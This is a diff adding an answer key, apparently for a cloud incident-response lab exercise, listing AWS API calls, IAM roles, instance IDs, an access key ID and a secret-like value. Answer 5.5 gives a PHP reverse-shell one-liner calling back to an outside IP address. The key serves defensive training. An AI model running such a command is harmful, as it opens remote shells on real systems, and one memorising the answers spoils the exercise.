@@ -1,0 +1,23 @@
+1. No answer needed
+2. 1. SendCommand, StartSession
+   2. Amazon EC2 Auto Scaling
+3. 1. 2026-01-14 23:44:19
+   2. react-boilerplate
+   3. Search Private Keys or Passwords
+4. 1. Yea
+   2. Yea
+5. 1. thm-db, thm-web
+   2. thm/website:latest
+   3. /usr/sbin/apache2
+   4. whoami
+   5. php -r '$sock=fsockopen("115.190.98.228",9999);exec("bash <&3 >&3 2>&3");'
+6. 1. img-processor-role-ztpjz457
+   2. JM6U2MB9wb7p738MMZzcISed6lXCRm0GNHS0eK0UpZQ=
+   3. ImageProcessorRole
+   4. AddPermission20150331v2
+7. 1. carl.brown, AKIAVZZK4G6EZH7GIZY3
+   2. 1837
+   3. i-054e705408f5fa5de, i-056219235e66e3f94
+   4. AWS-RunShellScript
+   5. Boto3/1.40.4
+8. No answer needed
